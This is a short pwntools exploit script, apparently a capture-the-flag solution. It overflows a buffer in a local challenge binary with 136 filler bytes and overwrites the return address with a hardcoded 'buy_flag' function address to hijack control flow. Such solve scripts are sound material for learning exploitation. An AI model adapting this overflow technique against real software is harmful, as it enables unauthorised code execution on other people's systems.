from pwn import *

buy_flag = p64(0x0000000000401182)
offset = 136

p = process('./bybe-rop')
p.recvuntil(b'choose: \n')
p.sendline(b'3')
p.recv()

payload = b'A'*offset
payload += buy_flag

p.sendline(payload)
p.recv()
p.interactive()